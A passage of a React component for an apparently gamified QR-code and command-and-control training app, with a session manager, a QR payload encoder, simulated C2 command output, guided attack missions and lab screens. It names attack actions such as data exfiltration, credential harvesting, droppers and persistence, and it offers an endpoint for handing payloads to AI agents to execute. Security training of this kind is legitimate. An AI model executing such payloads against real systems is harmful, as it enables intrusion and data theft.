              <Bot className="w-3 h-3 mr-1" /> Agent
            </TabsTrigger>
            <TabsTrigger value="c2" className="data-[state=active]:bg-red-900/50 data-[state=active]:text-red-400">
              <Radio className="w-3 h-3 mr-1" /> C2
            </TabsTrigger>
            <TabsTrigger value="import" className="data-[state=active]:bg-amber-900/50 data-[state=active]:text-amber-400">
              Decode
            </TabsTrigger>
          </TabsList>

          <TabsContent value="session" className="space-y-4 mt-4">
            {/* Current Session Info */}
            <div className="p-4 bg-teal-950/20 rounded border border-teal-900/30">
              <h3 className="text-teal-400 font-bold mb-3 flex items-center gap-2">
                <Key className="w-4 h-4" /> Current Session
              </h3>
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <span className="text-xs text-stone-500">Token:</span>
                  <code className="text-xs text-teal-400 bg-black/50 px-2 py-1 rounded max-w-[200px] truncate">
                    {gameState.sessionToken}
                  </code>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-xs text-stone-500">Fragments:</span>
                  <span className="text-xs text-teal-400">{gameState.inventory.length}</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-xs text-stone-500">Username:</span>
                  <span className="text-xs text-teal-400">{gameState.username}</span>
                </div>
              </div>
            </div>

            {/* Copy Token */}
            <Button 
              onClick={copySessionToken}
              className="w-full bg-teal-700 hover:bg-teal-600 text-black font-bold"
              data-testid="copy-session-token"
            >
              <Copy className="w-4 h-4 mr-2" />
              COPY SESSION TOKEN
            </Button>

            {sessionStatus !== 'idle' && (
              <div className={`p-3 rounded border font-mono text-sm flex items-center gap-2 ${
                sessionStatus === 'success'
                  ? 'bg-teal-950/30 border-teal-800/50 text-teal-400' 
                  : 'bg-red-950/30 border-red-800/50 text-red-400'
              }`}>
                {sessionStatus === 'success' ? <CheckCircle className="w-4 h-4" /> : <AlertCircle className="w-4 h-4" />}
                {sessionMessage}
              </div>
            )}

            {/* Import Session */}
            <div className="pt-4 border-t border-stone-800">
              <h4 className="text-sm text-amber-600 font-bold mb-3">Import Existing Session</h4>
              <div className="space-y-3">
                <Input
                  value={sessionInput}
                  onChange={(e) => setSessionInput(e.target.value)}
                  className="bg-black/50 border-amber-900/30 text-amber-500 font-mono"
                  placeholder="Paste session token here..."
                  data-testid="session-input"
                />
                <Button 
                  onClick={handleImportSession}
                  disabled={loading || !sessionInput.trim()}
                  className="w-full bg-amber-700 hover:bg-amber-600 text-black font-bold"
                  data-testid="import-session-btn"
                >
                  <Upload className="w-4 h-4 mr-2" />
                  {loading ? 'IMPORTING...' : 'IMPORT SESSION'}
                </Button>
              </div>
              <p className="text-xs text-stone-600 mt-2">
                Importing a session will replace your current progress with the imported session's data.
              </p>
            </div>
          </TabsContent>

          <TabsContent value="generate" className="space-y-4 mt-4">
            {/* Action Type Selector */}
            <div className="space-y-2">
              <label className="text-xs uppercase tracking-widest text-amber-700 flex items-center gap-2">
                <Zap className="w-3 h-3" />
                QR Action Type
              </label>
              <Select 
                value={selectedPreset} 
                onValueChange={(value) => {
                  setSelectedPreset(value);
                  const preset = QR_ACTION_PRESETS.find(p => p.id === value);
                  if (preset) setCode(preset.template);
                }}
              >
                <SelectTrigger className="bg-black/50 border-amber-900/30 text-amber-500">
                  <SelectValue placeholder="Select action type" />
                </SelectTrigger>
                <SelectContent className="bg-[#0a0500] border-amber-900/50">
                  {QR_ACTION_PRESETS.map((preset) => (
                    <SelectItem 
                      key={preset.id} 
                      value={preset.id}
                      className="text-amber-500 focus:bg-amber-900/30 focus:text-amber-400"
                    >
                      {preset.name}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              <p className="text-xs text-stone-600">
                {QR_ACTION_PRESETS.find(p => p.id === selectedPreset)?.description}
              </p>
            </div>

            {/* Editable Payload */}
            <div className="space-y-2">
              <label className="text-xs uppercase tracking-widest text-amber-700">
                Payload Code (Edit Below)
              </label>
              <Textarea
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className="bg-black/50 border-amber-900/30 text-amber-500 font-mono h-32 resize-none"
                placeholder='{"type":"secret","data":"your_message"}'
              />
              <p className="text-xs text-stone-600">
                Edit the JSON above to customize what this QR code does when scanned.
              </p>
            </div>

            <Button 
              onClick={generateQR} 
              disabled={loading}
              className="w-full bg-amber-700 hover:bg-amber-600 text-black font-bold"
            >
              {loading ? <RefreshCw className="w-4 h-4 animate-spin" /> : 'ENCODE TO QR'}
            </Button>

            {qrImage && (
              <div className="flex flex-col items-center gap-4 p-4 bg-black/30 rounded border border-amber-900/20">
                <img src={qrImage} alt="Generated QR Code" className="w-48 h-48" />
                <div className="flex gap-2">
                  <Button variant="outline" size="sm" onClick={downloadQR} className="border-amber-800 text-amber-600">
                    <Download className="w-4 h-4 mr-2" /> Download
                  </Button>
                  <Button variant="outline" size="sm" onClick={copyToClipboard} className="border-amber-800 text-amber-600">
                    <Copy className="w-4 h-4 mr-2" /> Copy Data URL
                  </Button>
                </div>
                
                {/* Agent Execution Info */}
                <div className="w-full mt-2 p-3 bg-amber-950/20 rounded border border-amber-900/30 text-left">
                  <p className="text-xs text-amber-600 font-bold mb-1">AGENT EXECUTION</p>
                  <p className="text-xs text-stone-500 mb-2">Give this payload to an agent to execute elsewhere:</p>
                  <code className="block text-xs text-amber-500/80 bg-black/50 p-2 rounded overflow-x-auto">
                    POST /api/agent/execute<br/>
                    {`{ "payload": ${code.substring(0, 50)}${code.length > 50 ? '...' : ''} }`}
                  </code>
                </div>
              </div>
            )}
          </TabsContent>

          <TabsContent value="export" className="space-y-4 mt-4">
            <div className="p-4 bg-amber-950/20 rounded border border-amber-900/30">
              <h3 className="text-amber-500 font-bold mb-2">Current Session</h3>
              <p className="text-xs text-stone-500">Token: {gameState.sessionToken.substring(0, 16)}...</p>
              <p className="text-xs text-stone-500">Clues Collected: {gameState.inventory.length}</p>
              <p className="text-xs text-stone-500">Username: {gameState.username}</p>
            </div>

            <Button 
              onClick={exportSession} 
              disabled={loading}
              className="w-full bg-amber-700 hover:bg-amber-600 text-black font-bold"
            >
              {loading ? <RefreshCw className="w-4 h-4 animate-spin" /> : 'EXPORT SESSION AS QR'}
            </Button>

            {qrImage && (
              <div className="flex flex-col items-center gap-4 p-4 bg-black/30 rounded border border-amber-900/20">
                <img src={qrImage} alt="Session QR Code" className="w-48 h-48" />
                <p className="text-xs text-stone-600">Share this QR to transfer your progress</p>
                <Button variant="outline" size="sm" onClick={downloadQR} className="border-amber-800 text-amber-600">
                  <Download className="w-4 h-4 mr-2" /> Download
                </Button>
              </div>
            )}
          </TabsContent>

          <TabsContent value="agent" className="space-y-4 mt-4">
            <div className="p-4 bg-amber-950/20 rounded border border-amber-900/30">
              <h3 className="text-amber-500 font-bold mb-2 flex items-center gap-2">
                <Bot className="w-4 h-4" /> Agent Execution API
              </h3>
              <p className="text-xs text-stone-500 mb-2">
                Execute QR payloads via the agent API. Give the payload to any automated system or AI agent.
              </p>
              <code className="block text-xs text-stone-400 bg-black/50 p-2 rounded">
                POST /api/agent/execute
              </code>
            </div>

            <div className="space-y-2">
              <label className="text-xs uppercase tracking-widest text-amber-700">Current Payload</label>
              <Textarea
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className="bg-black/50 border-amber-900/30 text-amber-500 font-mono h-24 resize-none text-xs"
              />
            </div>

            <div className="flex gap-2">
              <Button 
                onClick={executeViaAgent} 
                disabled={loading}
                className="flex-1 bg-amber-700 hover:bg-amber-600 text-black font-bold"
              >
                <Play className="w-4 h-4 mr-2" />
                {loading ? 'EXECUTING...' : 'EXECUTE NOW'}
              </Button>
              <Button 
                onClick={copyPayloadForAgent}
                variant="outline"
                className="border-amber-800 text-amber-600"
              >
                <Copy className="w-4 h-4 mr-2" /> Copy for Agent
              </Button>
            </div>

            {agentResult && (
              <div className="p-3 rounded border bg-black/50 border-amber-800/50">
                <p className="text-xs text-amber-600 font-bold mb-1">EXECUTION RESULT</p>
                <pre className="text-xs text-amber-500/80 overflow-x-auto whitespace-pre-wrap max-h-40 overflow-y-auto">
                  {agentResult}
                </pre>
              </div>
            )}

            <div className="p-3 bg-black/30 rounded border border-amber-900/20">
              <p className="text-xs text-amber-700 font-bold mb-2">AVAILABLE ACTION TYPES</p>
              <div className="grid grid-cols-2 gap-1 text-xs text-stone-500">
                <span>• beacon (C2 check-in)</span>
                <span>• exfil (data extraction)</span>
                <span>• inject (code injection)</span>
                <span>• phish (credential harvest)</span>
                <span>• dropper (payload drop)</span>
                <span>• pivot (network pivot)</span>
                <span>• recon (reconnaissance)</span>
                <span>• persist (persistence)</span>
                <span>• crypto (cipher challenge)</span>
                <span>• raw (raw data)</span>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="c2" className="space-y-4 mt-4 max-h-[60vh] overflow-y-auto">
            <div className="flex gap-1 p-1 bg-black/30 rounded border border-red-900/20 overflow-x-auto no-scrollbar">
              <Button
                variant={c2Section === 'missions' ? 'default' : 'ghost'}
                size="sm"
                onClick={() => setC2Section('missions')}
                className={`shrink-0 min-h-[44px] ${c2Section === 'missions' ? 'bg-amber-700 text-white' : 'text-amber-400 hover:bg-amber-950/30'}`}
                data-testid="c2-section-missions"
              >
                <Zap className="w-3 h-3 mr-1" /> Missions
              </Button>
              <Button
                variant={c2Section === 'encode' ? 'default' : 'ghost'}
                size="sm"
                onClick={() => setC2Section('encode')}
                className={`shrink-0 min-h-[44px] ${c2Section === 'encode' ? 'bg-red-700 text-white' : 'text-red-400 hover:bg-red-950/30'}`}
                data-testid="c2-section-encode"
              >
                <Terminal className="w-3 h-3 mr-1" /> Encode
              </Button>
              <Button
                variant={c2Section === 'vectors' ? 'default' : 'ghost'}
                size="sm"
                onClick={() => setC2Section('vectors')}
                className={`shrink-0 min-h-[44px] ${c2Section === 'vectors' ? 'bg-red-700 text-white' : 'text-red-400 hover:bg-red-950/30'}`}
                data-testid="c2-section-vectors"
              >
                <Zap className="w-3 h-3 mr-1" /> Vectors
              </Button>
              <Button
                variant={c2Section === 'labs' ? 'default' : 'ghost'}
                size="sm"
                onClick={() => setC2Section('labs')}
                className={`shrink-0 min-h-[44px] ${c2Section === 'labs' ? 'bg-red-700 text-white' : 'text-red-400 hover:bg-red-950/30'}`}
                data-testid="c2-section-labs"
              >
                <Key className="w-3 h-3 mr-1" /> Labs
              </Button>
            </div>

            {/* ENCODE SECTION */}
            {c2Section === 'encode' && (
              <>
                {/* Target Machine Selector */}
                <div className="p-3 bg-red-950/20 rounded border border-red-900/30">
                  <label className="text-xs uppercase tracking-widest text-red-700 mb-2 block">Target Machine</label>
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
                    {TARGET_MACHINES.map((target) => (
                      <Button
                        key={target.id}
                        variant={selectedTarget === target.id ? 'default' : 'outline'}
                        size="sm"
                        onClick={() => setSelectedTarget(target.id)}
                        className={`text-xs h-auto py-2 ${selectedTarget === target.id 
                          ? 'bg-red-700 text-white' 
                          : 'border-red-900/30 text-red-400 hover:bg-red-950/30'}`}
                      >
                        <span className="mr-1">{target.icon}</span>
                        <span className="truncate">{target.name}</span>
                      </Button>
                    ))}
                  </div>
                  <p className="text-xs text-stone-500 mt-2">
                    {TARGET_MACHINES.find(t => t.id === selectedTarget)?.description} • {TARGET_MACHINES.find(t => t.id === selectedTarget)?.os}
                  </p>
                </div>

                {/* Command Template */}
                <div className="space-y-2">
                  <label className="text-xs uppercase tracking-widest text-red-700 flex items-center gap-2">
                    <Terminal className="w-3 h-3" /> Command Template
                  </label>
                  <Select 
                    value={c2SelectedTemplate} 
                    onValueChange={(value) => {
                      setC2SelectedTemplate(value);
                      const template = C2_COMMAND_TEMPLATES.find(t => t.id === value);
                      if (template && template.template) setC2Command(template.template);
                    }}
                  >
                    <SelectTrigger className="bg-black/50 border-red-900/30 text-red-500">
                      <SelectValue placeholder="Select command template" />
                    </SelectTrigger>
                    <SelectContent className="bg-[#0a0500] border-red-900/50">
                      {C2_COMMAND_TEMPLATES.map((template) => (
                        <SelectItem 
                          key={template.id} 
                          value={template.id}
                          className="text-red-500 focus:bg-red-900/30 focus:text-red-400"
                        >
                          {template.name}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>

                {/* Command Input */}
                <div className="space-y-2">
                  <label className="text-xs uppercase tracking-widest text-red-700">Command to Execute</label>
                  <Input
                    value={c2Command}
                    onChange={(e) => setC2Command(e.target.value)}
                    className="bg-black/50 border-red-900/30 text-red-500 font-mono"
                    placeholder="Enter shell command..."
                    data-testid="c2-command-input"
                  />
                </div>

                {/* Generate & Simulate */}
                <div className="flex gap-2">
                  <Button 
                    onClick={generateC2CommandQR} 
                    disabled={loading || !c2Command}
                    className="flex-1 bg-red-700 hover:bg-red-600 text-white font-bold min-h-[44px]"
                    data-testid="generate-c2-qr"
                  >
                    <QrCode className="w-4 h-4 mr-2" />
                    {loading ? 'ENCODING...' : 'ENCODE'}
                  </Button>
                  <Button 
                    onClick={simulateC2Result}
                    disabled={!c2CommandQR}
                    variant="outline"
                    className="border-red-800 text-red-600 hover:bg-red-950/30 min-h-[44px]"
                    data-testid="simulate-c2-result"
                  >
                    <Play className="w-4 h-4 mr-2" /> Simulate
                  </Button>
                </div>

                {/* Generated QR & Simulated Response */}
                {c2CommandQR && (
                  <div className="flex flex-col items-center gap-3 p-4 bg-black/30 rounded border border-red-900/20">
                    <img src={c2CommandQR} alt="C2 Command QR" className="w-32 h-32" />
                    <Button variant="outline" size="sm" onClick={() => {
                      if (c2CommandQR) {
                        const link = document.createElement('a');
                        link.href = c2CommandQR;
                        link.download = `c2-cmd-${c2CommandIndex - 1}.png`;
                        link.click();
                      }
                    }} className="border-red-800 text-red-600 min-h-[44px]">
                      <Download className="w-4 h-4 mr-2" /> Download
                    </Button>
                  </div>
                )}

                {/* Results History with Realistic Output */}
                {c2Results.length > 0 && (
                  <div className="space-y-2">
                    <label className="text-xs uppercase tracking-widest text-red-700">Simulated Target Response</label>
                    <div className="max-h-48 overflow-y-auto space-y-2">
                      {c2Results.slice(-3).reverse().map((result) => (
                        <div key={result.id} className="p-3 bg-black/50 rounded border border-red-900/20 text-xs font-mono">
                          <div className="flex justify-between text-stone-500 mb-2 border-b border-red-900/20 pb-1">
                            <code className="text-red-400">$ {result.command}</code>
                            <span className="text-stone-600">{TARGET_MACHINES.find(t => t.id === selectedTarget)?.name}</span>
                          </div>
                          <pre className="text-amber-400/90 whitespace-pre-wrap">{result.result}</pre>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </>
            )}

            {/* C2 GUIDED MISSIONS SECTION */}
            {c2Section === 'missions' && (
              <div className="space-y-3">
                <div className="p-3 bg-amber-950/20 rounded border border-amber-900/30">
                  <h4 className="text-amber-400 font-bold text-sm mb-1">C2 Training Missions</h4>
                  <p className="text-xs text-stone-400">
                    Step-by-step guided missions teaching real C2 techniques. Complete missions to earn XP, collect intel clues, and unlock campaign progress.
                  </p>
                  <div className="flex flex-wrap gap-2 mt-2">
                    <span className="text-[10px] px-2 py-0.5 rounded bg-amber-950/50 border border-amber-800/30 text-amber-400">
                      {missionCompleted.size}/{C2_GUIDED_MISSIONS.length} Completed
                    </span>
                    <span className="text-[10px] px-2 py-0.5 rounded bg-teal-950/50 border border-teal-800/30 text-teal-400">
                      {C2_GUIDED_MISSIONS.reduce((sum, m) => sum + (missionCompleted.has(m.id) ? m.xpReward : 0), 0)} XP Earned
                    </span>
                  </div>
                </div>

                {!activeMission ? (
                  <div className="space-y-2">
                    {C2_GUIDED_MISSIONS.map((mission) => {
                      const completed = missionCompleted.has(mission.id);
                      return (
                        <div
                          key={mission.id}
                          className={`p-3 rounded border cursor-pointer transition-all ${
                            completed
                              ? 'bg-teal-950/20 border-teal-800/30'
                              : 'bg-black/30 border-amber-900/20 hover:border-amber-700/50'
                          }`}
                          onClick={() => { setActiveMission(mission.id); setMissionStep(0); }}
                          data-testid={`mission-${mission.id}`}
                        >
                          <div className="flex items-center gap-2 mb-1 flex-wrap">
                            <span className="text-lg">{mission.icon}</span>
                            <span className={`text-sm font-bold ${completed ? 'text-teal-400' : 'text-amber-400'}`}>
                              {mission.name}
                            </span>
                            <span className={`text-[10px] px-1.5 py-0.5 rounded ${
                              mission.difficulty === 'beginner' ? 'bg-green-950 text-green-400' :
                              mission.difficulty === 'intermediate' ? 'bg-yellow-950 text-yellow-400' :
                              mission.difficulty === 'advanced' ? 'bg-red-950 text-red-400' :
                              'bg-purple-950 text-purple-400'
                            }`}>
                              {mission.difficulty}
                            </span>
                            <span className="text-[10px] px-1.5 py-0.5 rounded bg-amber-950/50 text-amber-500 border border-amber-900/30">
                              +{mission.xpReward} XP
                            </span>
                            {completed && (
                              <CheckCircle className="w-4 h-4 text-teal-500 ml-auto" />
                            )}
                          </div>
                          <p className="text-xs text-stone-400">{mission.description}</p>
                          <div className="flex flex-wrap gap-1 mt-2">
                            {mission.campaignTags.map(tag => (
                              <span key={tag} className="text-[9px] px-1.5 py-0.5 rounded bg-stone-900 text-stone-500 border border-stone-800">
                                {tag}
                              </span>
                            ))}
                          </div>
                        </div>
                      );
                    })}
                  </div>
                ) : (
                  (() => {
                    const mission = C2_GUIDED_MISSIONS.find(m => m.id === activeMission);
                    if (!mission) return null;
                    const step = mission.steps[missionStep];
                    const isLastStep = missionStep === mission.steps.length - 1;
                    const completed = missionCompleted.has(mission.id);

                    return (
                      <div className="space-y-3">
                        <div className="flex items-center gap-2 flex-wrap">
                          <Button
                            variant="ghost"
                            size="sm"
                            onClick={() => { setActiveMission(null); setMissionStep(0); }}
                            className="text-stone-400 hover:text-amber-400 min-h-[44px]"
                            data-testid="mission-back"
                          >
                            Back
                          </Button>
                          <span className="text-lg">{mission.icon}</span>
                          <span className="text-sm text-amber-400 font-bold">{mission.name}</span>
                          <span className={`text-[10px] px-1.5 py-0.5 rounded ${
                            mission.difficulty === 'beginner' ? 'bg-green-950 text-green-400' :
                            mission.difficulty === 'intermediate' ? 'bg-yellow-950 text-yellow-400' :
                            mission.difficulty === 'advanced' ? 'bg-red-950 text-red-400' :
                            'bg-purple-950 text-purple-400'
                          }`}>
                            {mission.difficulty}
                          </span>
                        </div>

                        <div className="p-3 bg-amber-950/20 rounded border border-amber-900/30">
                          <p className="text-xs text-amber-600 font-bold mb-1">MISSION BRIEFING</p>
                          <p className="text-xs text-stone-300">{mission.briefing}</p>
                          <div className="mt-2">
                            <p className="text-[10px] text-amber-700 font-bold mb-1">OBJECTIVES:</p>
                            <ul className="text-xs text-stone-400 space-y-0.5">
                              {mission.objectives.map((obj, i) => (
                                <li key={i} className="flex gap-2">
                                  <span className={`${i <= missionStep ? 'text-teal-500' : 'text-stone-600'}`}>
                                    {i <= missionStep ? '✓' : '○'}
                                  </span>
                                  <span className={i <= missionStep ? 'text-teal-400' : ''}>{obj}</span>
                                </li>
                              ))}
                            </ul>
                          </div>
                        </div>

                        <div className="flex gap-1 overflow-x-auto no-scrollbar pb-1">
                          {mission.steps.map((_, i) => (
                            <Button
                              key={i}
                              variant={i === missionStep ? 'default' : 'ghost'}
                              size="sm"
                              onClick={() => setMissionStep(i)}
                              className={`shrink-0 min-h-[36px] min-w-[36px] ${
                                i === missionStep ? 'bg-amber-700 text-white' :
                                i < missionStep ? 'text-teal-400 bg-teal-950/30' :
                                'text-stone-500'
                              }`}
                            >
                              {i + 1}
                            </Button>
                          ))}
                        </div>

                        {step && (
                          <div className="space-y-3">
                            <div className="p-3 bg-black/50 rounded border border-amber-900/20">
                              <p className="text-xs text-amber-500 font-bold mb-2">
                                Step {missionStep + 1} of {mission.steps.length}
                              </p>
                              <p className="text-xs text-stone-300 mb-3">{step.instruction}</p>

                              <div className="p-2 bg-black/50 rounded border border-red-900/20 mb-2">
                                <p className="text-[10px] text-red-700 font-bold mb-1">COMMAND:</p>
                                <code className="text-xs text-red-400 break-all">{step.command}</code>
                              </div>

                              <div className="p-2 bg-black/50 rounded border border-teal-900/20 mb-2">
                                <p className="text-[10px] text-teal-700 font-bold mb-1">EXPECTED OUTPUT:</p>
                                <pre className="text-xs text-teal-400/80 whitespace-pre-wrap">{step.expectedOutput}</pre>
                              </div>

                              <div className="p-2 bg-amber-950/20 rounded border border-amber-900/20">
                                <p className="text-[10px] text-amber-600 font-bold mb-1">WHY THIS MATTERS:</p>
                                <p className="text-xs text-stone-300">{step.teaching}</p>
                              </div>
                            </div>

                            <div className="flex gap-2 flex-wrap">
                              <Button
                                onClick={() => {
                                  startMissionStep(mission.id, missionStep);
                                  setC2Section('encode');
                                }}
                                className="flex-1 bg-red-700 hover:bg-red-600 text-white font-bold min-h-[44px]"
                                data-testid="mission-try-command"
                              >
                                <Terminal className="w-4 h-4 mr-2" />
                                Try in Encoder
                              </Button>
                              <Button
                                onClick={async () => {
                                  try {
                                    const response = await fetch('/api/qr/secret', {
                                      method: 'POST',
                                      headers: { 'Content-Type': 'application/json' },
                                      body: JSON.stringify({
                                        secretId: `mission-${mission.id}-step-${missionStep}`,
                                        hint: step.command
                                      })
                                    });
                                    const data = await response.json();
                                    setMissionQR(data.qrCode);
                                  } catch (e) {
                                    console.error('QR gen error:', e);
                                  }
                                }}
                                variant="outline"
                                className="border-amber-800 text-amber-600 min-h-[44px]"
                                data-testid="mission-encode-qr"
                              >
                                <QrCode className="w-4 h-4 mr-2" /> Encode QR
                              </Button>
                            </div>

                            {missionQR && (
                              <div className="flex flex-col items-center gap-2 p-3 bg-black/30 rounded border border-amber-900/20" data-testid="mission-qr-display">
                                <img src={missionQR} alt="Mission Step QR" className="w-28 h-28" data-testid="mission-qr-image" />
                                <p className="text-[10px] text-stone-500">Step {missionStep + 1} encoded as QR</p>
                              </div>
                            )}

                            <div className="flex gap-2 flex-wrap">
                              {missionStep > 0 && (
                                <Button
                                  variant="ghost"
                                  onClick={() => setMissionStep(prev => prev - 1)}
                                  className="text-stone-400 min-h-[44px]"
                                  data-testid="mission-prev-step"
                                >
                                  Previous
                                </Button>
                              )}
                              {!isLastStep ? (
                                <Button
                                  onClick={() => setMissionStep(prev => prev + 1)}
                                  className="flex-1 bg-amber-700 hover:bg-amber-600 text-black font-bold min-h-[44px]"
                                  data-testid="mission-next-step"
                                >
                                  Next Step
                                </Button>
                              ) : (
                                <Button
                                  onClick={() => {
                                    completeMission(mission.id);
                                    setActiveMission(null);
                                    setMissionStep(0);
                                  }}
                                  disabled={completed}
                                  className="flex-1 bg-teal-700 hover:bg-teal-600 text-black font-bold min-h-[44px]"
                                  data-testid="mission-complete"
                                >
                                  <CheckCircle className="w-4 h-4 mr-2" />
                                  {completed ? 'Already Completed' : `Complete Mission (+${mission.xpReward} XP)`}
                                </Button>
                              )}
                            </div>
                          </div>
                        )}

                        <div className="space-y-2 mt-2">
                          <div className="p-3 bg-red-950/20 rounded border border-red-900/20">
                            <p className="text-xs text-red-400 font-bold mb-1">REAL-WORLD CASE:</p>
                            <p className="text-xs text-stone-300">{mission.realWorldCase}</p>
                          </div>
                          <div className="p-3 bg-blue-950/20 rounded border border-blue-900/20">
                            <p className="text-xs text-blue-400 font-bold mb-1">DEFENDER PERSPECTIVE:</p>
                            <p className="text-xs text-stone-300">{mission.defenderPerspective}</p>
                          </div>
                        </div>
                      </div>
                    );
                  })()
                )}

                {!activeMission && (
                  <div className="p-3 bg-black/30 rounded border border-stone-800">
                    <p className="text-xs text-amber-600 font-bold mb-2">ATTACK FLOW TEMPLATES</p>
                    <p className="text-xs text-stone-500 mb-2">Pre-built multi-step attack sequences. Click to explore each phase.</p>
                    <div className="grid gap-2">
                      {ATTACK_FLOW_TEMPLATES.map((flow) => (
                        <div key={flow.id} className={`rounded border transition-all ${
                          selectedFlow === flow.id ? 'bg-red-950/30 border-red-700' : 'bg-black/30 border-stone-800 hover:border-red-700/50'
                        }`} data-testid={`flow-${flow.id}`}>
                          <div
                            className="p-2 cursor-pointer flex items-center gap-2"
                            onClick={() => setSelectedFlow(selectedFlow === flow.id ? null : flow.id)}
                          >
                            <span>{flow.icon}</span>
                            <span className="text-xs text-red-400 font-bold">{flow.name}</span>
                            <span className={`text-[10px] ml-auto px-1.5 py-0.5 rounded ${
                              flow.phase === 'recon' ? 'bg-blue-950 text-blue-400' :
                              flow.phase === 'access' ? 'bg-orange-950 text-orange-400' :
                              flow.phase === 'persist' ? 'bg-purple-950 text-purple-400' :
                              'bg-red-950 text-red-400'
                            }`}>
                              {flow.phase}
                            </span>
                          </div>
                          {selectedFlow === flow.id && (
                            <div className="px-2 pb-2 space-y-1 border-t border-red-900/20 pt-2">
                              <p className="text-xs text-stone-400 mb-2">{flow.description}</p>
                              {flow.commands.map((cmd, i) => (
                                <div key={i} className="p-1.5 bg-black/50 rounded">
                                  <p className="text-[10px] text-stone-500">{cmd.desc}</p>
                                  <code className="text-[11px] text-red-400">{cmd.cmd}</code>
                                </div>
                              ))}
                              <Button
                                size="sm"
                                onClick={() => {
                                  setC2Command(flow.commands[0].cmd);
                                  setC2Section('encode');
                                }}
                                className="w-full bg-red-800 hover:bg-red-700 text-white mt-1 min-h-[44px]"
                                data-testid={`flow-load-${flow.id}`}
                              >
                                <Terminal className="w-3 h-3 mr-1" /> Load into Encoder
                              </Button>
                            </div>
                          )}
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            )}

            {/* ATTACK VECTORS SECTION */}
            {c2Section === 'vectors' && (
              <div className="space-y-3">
                <p className="text-xs text-stone-400">
                  Learn how malicious QR codes reach targets in the real world. Click any vector to see real-world examples and lab scenarios.
                </p>
                
                {/* Category Filter */}
                <div className="flex flex-wrap gap-1">
                  {['physical', 'digital', 'social', 'supply_chain'].map((cat) => (
                    <span key={cat} className={`text-xs px-2 py-1 rounded border ${
                      cat === 'physical' ? 'border-blue-800 text-blue-400' :
                      cat === 'digital' ? 'border-purple-800 text-purple-400' :
                      cat === 'social' ? 'border-pink-800 text-pink-400' :
                      'border-orange-800 text-orange-400'
                    }`}>
                      {cat.replace('_', ' ')}
                    </span>
                  ))}
                </div>

                {/* Vectors Grid */}
                <div className="grid gap-2">
                  {QR_INGESTION_VECTORS.map((vector) => (
                    <div 
                      key={vector.id}
                      className={`p-3 rounded border cursor-pointer transition-all ${
                        selectedVector === vector.id 
                          ? 'bg-red-950/40 border-red-700' 
                          : 'bg-black/30 border-red-900/20 hover:border-red-700/50'
                      }`}
                      onClick={() => setSelectedVector(selectedVector === vector.id ? null : vector.id)}
                    >
                      <div className="flex items-center gap-2 mb-1">
                        <span className="text-lg">{vector.icon}</span>
                        <span className="text-sm text-red-400 font-bold">{vector.name}</span>
                        <span className={`text-xs px-1.5 py-0.5 rounded ${
                          vector.difficulty === 'beginner' ? 'bg-green-950 text-green-400' :
                          vector.difficulty === 'intermediate' ? 'bg-yellow-950 text-yellow-400' :
                          'bg-red-950 text-red-400'
                        }`}>
                          {vector.difficulty}
                        </span>
                      </div>
                      <p className="text-xs text-stone-400">{vector.description}</p>
                      
                      {selectedVector === vector.id && (
                        <div className="mt-3 pt-3 border-t border-red-900/30 space-y-3">
                          <div>
                            <p className="text-xs text-red-500 font-bold mb-1">Real-World Cases:</p>
                            <ul className="text-xs text-stone-400 space-y-1">
                              {vector.realExamples.map((ex, i) => (
                                <li key={i} className="flex gap-2">
                                  <span className="text-red-600">•</span>
                                  <span>{ex}</span>
                                </li>
                              ))}
                            </ul>
                          </div>
                          <div className="p-2 bg-black/50 rounded">
                            <p className="text-xs text-amber-500 font-bold mb-1">Lab Scenario:</p>
                            <p className="text-xs text-stone-300">{vector.labScenario}</p>
                          </div>
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* QR LABS SECTION */}
            {c2Section === 'labs' && (
              <div className="space-y-3">
                <div className="p-3 bg-amber-950/20 rounded border border-amber-900/30">
                  <div className="flex items-center justify-between mb-1">
                    <h4 className="text-amber-400 font-bold text-sm">QR-in-QR Hijacking Labs</h4>
                    <span className="text-xs text-stone-500">
                      {Array.from(labCompleted).length}/{QR_INCEPTION_LABS.length} Complete
                    </span>
                  </div>
                  <p className="text-xs text-stone-400">
                    Interactive exercises teaching QR code attack and defense techniques. Generate real QR codes, simulate multi-scanner attacks, and earn XP.
                  </p>
                  <div className="mt-2 w-full bg-stone-800 rounded-full h-1.5">
                    <div 
                      className="bg-amber-600 h-1.5 rounded-full transition-all"
                      style={{ width: `${(Array.from(labCompleted).length / QR_INCEPTION_LABS.length) * 100}%` }}
                    />
                  </div>
                </div>

                {activeLabId ? (() => {
                  const lab = QR_INCEPTION_LABS.find(l => l.id === activeLabId);
                  if (!lab) return null;
                  const sim = LAB_SIMULATIONS[activeLabId];
                  const xpReward = lab.difficulty === 'beginner' ? 40 : lab.difficulty === 'intermediate' ? 65 : 100;
                  const totalSteps = 4;

                  return (
                    <div className="space-y-3" data-testid="active-lab-view">
                      <div className="flex items-center justify-between">
                        <button
                          onClick={() => { setActiveLabId(null); setLabStep(0); setLabScanResults([]); setLabQrResults({}); }}
                          className="text-xs text-stone-500 hover:text-amber-400 flex items-center gap-1"
                          data-testid="lab-back-btn"
                        >
                          <ChevronLeft className="w-3 h-3" /> Back to Labs
                        </button>
                        <span className="text-xs text-amber-600">{xpReward} XP</span>
                      </div>

                      <div className="p-3 bg-amber-950/30 rounded border border-amber-700">
                        <h4 className="text-amber-400 font-bold text-sm mb-1">{lab.title}</h4>
                        <p className="text-xs text-stone-300 mb-2">{lab.objective}</p>
                        <div className="flex gap-1">
                          {Array.from({ length: totalSteps }).map((_, i) => (
                            <div key={i} className={`flex-1 h-1.5 rounded-full ${i <= labStep ? 'bg-amber-500' : 'bg-stone-700'}`} />
                          ))}
                        </div>
                        <p className="text-xs text-stone-500 mt-1">Step {labStep + 1} of {totalSteps}</p>
                      </div>

                      {labStep === 0 && (
                        <div className="space-y-3" data-testid="lab-step-0">
